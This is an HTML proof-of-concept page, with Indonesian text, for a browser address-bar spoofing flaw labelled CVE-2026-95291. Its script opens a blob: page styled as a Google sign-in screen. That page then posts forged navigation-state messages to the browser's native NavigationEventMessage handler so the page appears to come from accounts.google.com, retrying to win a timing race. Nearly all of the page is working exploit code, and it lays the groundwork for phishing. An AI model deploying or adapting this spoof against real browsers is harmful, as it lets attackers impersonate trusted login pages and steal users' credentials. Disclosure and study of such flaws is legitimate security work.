<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>CVE-2026-95291 Standalone PoC</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #0d0d0d;
        color: #ffffff;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .container {
        background: #1a1a1a;
        padding: 40px;
        border-radius: 16px;
        text-align: center;
        box-shadow: 0 10px 30px rgba(0,0,0,0.6);
        max-width: 460px;
        width: 90%;
      }
      button {
        padding: 18px 32px;
        font-size: 16px;
        font-weight: bold;
        background: #007aff;
        color: #fff;
        border: none;
        border-radius: 12px;
        cursor: pointer;
        transition: background 0.2s ease;
      }
      button:hover {
        background: #005bb5;
      }
      .log-box {
        margin-top: 20px;
        padding: 12px;
        background: #111;
        border: 1px solid #333;
        border-radius: 8px;
        font-family: monospace;
        font-size: 12px;
        color: #00ff66;
        text-align: left;
        max-height: 120px;
        overflow-y: auto;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h2 style="margin-top:0; color:#ff3b30;">Blob Origin Spoofing PoC</h2>
      <p style="font-size:14px; color:#aaa; margin-bottom:24px;">
        Demonstrasi kolisi URL <code>blob:</code> melalui <code>NavigationEventMessage</code>.
      </p>
      <button id="runPoC">LUNCURKAN PoC</button>
      <div class="log-box" id="logOutput">Status: Menunggu aksi...</div>
    </div>

    <script>
      function log(msg) {
        const box = document.getElementById("logOutput");
        box.innerText += "\n> " + msg;
        box.scrollTop = box.scrollHeight;
      }

      // Payload HTML yang akan dibungkus ke dalam blob URL lokal
      const maliciousBlobContent = `
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="utf-8">
          <title>Google Sign-In</title>
        </head>
        <body style="margin:0;padding:0;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
          <div style="padding: 40px; max-width: 400px;">
            <h1 style="font-size:28px;color:#202124;margin-bottom:10px;">Google</h1>
            <p style="font-size:16px;color:#5f6368;margin-bottom:20px;">Verifikasi identitas Anda untuk melanjutkan.</p>
            <div style="border: 1px solid #dadce0; padding: 15px; border-radius: 8px; background: #f8f9fa;">
              <p style="font-size:12px;color:#d93025;margin:0;font-weight:600;">[Simulasi Konten Penyerang]</p>
            </div>
          </div>
          <script>
            (function() {
              const writeLog = (m) => { try { console.log('[BLOB] ' + m); } catch(e){} };
              
              const mh = (window.webkit && window.webkit.messageHandlers) || {};
              if (!mh.NavigationEventMessage) {
                writeLog('NavigationEventMessage handler tidak ditemukan.');
                return;
              }

              const executeSpoof = (attempt) => {
                try {
                  let fid = (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') 
                    ? window.__gCrWeb.getFrameId() 
                    : "main-frame";

                  if (window.__gCrWeb && typeof window.__gCrWeb.registerFrame === 'function') {
                    window.__gCrWeb.registerFrame();
                  }

                  // Mengirimkan pesan state berurutan ke handler native
                  mh.NavigationEventMessage.postMessage({
                    command: 'willChangeState',
                    frame_id: fid
                  });

                  mh.NavigationEventMessage.postMessage({
                    command: 'didReplaceState',
                    frame_id: fid,
                    stateObject: '',
                    baseUrl: 'https://x/',
                    pageUrl: 'blob:https://accounts.google.com/signin'
                  });

                  writeLog('Pesan terkirim pada percobaan: ' + attempt);
                } catch(err) {
                  writeLog('Gagal mengirim pesan: ' + err);
                }
              };

              // Penjadwalan berulang untuk mengatasi race condition timing awal
              setTimeout(() => executeSpoof(1), 150);
              setTimeout(() => executeSpoof(2), 500);
              setTimeout(() => executeSpoof(3), 1200);
            })();
          <\/script>
        </body>
        </html>
      `;

      document.getElementById("runPoC").onclick = function () {
        log("Membuat objek Blob lokal...");
        const blob = new Blob([maliciousBlobContent], { type: 'text/html' });
        const blobUrl = URL.createObjectURL(blob);

        log("Membuka dokumen blob di jendela baru...");
        const targetTab = window.open(blobUrl, "_blank");

        if (targetTab) {
          log("Tab berhasil dibuka. Memantau respons...");
        } else {
          log("Gagal: Terblokir oleh penangkal pop-up peramban.");
        }
      };
    </script>
  </body>
</html>
